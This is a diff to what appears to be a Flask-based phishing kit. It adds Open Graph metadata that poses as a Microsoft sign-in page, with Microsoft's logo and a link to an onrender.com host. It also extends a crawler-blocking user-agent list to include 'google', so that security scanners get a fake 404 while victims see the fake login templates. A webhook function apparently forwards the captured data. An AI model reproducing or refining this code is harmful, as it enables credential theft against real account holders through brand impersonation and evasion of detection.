@@ -34,7 +34,8 @@ def get_template():
             template_name = config.get('template', 'google')
     except:
         template_name = 'google'
-templates = {
+    
+    templates = {
         'google': '''
 <!DOCTYPE html>
 <html>
@@ -85,6 +86,11 @@ templates = {
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta property="og:title" content="Iniciar sesión - Microsoft" />
+    <meta property="og:description" content="Accede a tu cuenta Microsoft" />
+    <meta property="og:image" content="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" />
+    <meta property="og:url" content="https://video-xeen.onrender.com" />
+    <meta property="og:type" content="website" />
     <title>Iniciar sesión en tu cuenta</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
@@ -198,7 +204,7 @@ def send_webhook(data):
 @app.route('/')
 def index():
     user_agent = request.headers.get('User-Agent', '')
-    bots = ['bot', 'crawler', 'spider', 'bing']
+    bots = ['bot', 'crawler', 'spider', 'google', 'bing']
     if any(bot in user_agent.lower() for bot in bots):
         return "404 Not Found", 404
     return render_template_string(get_template())
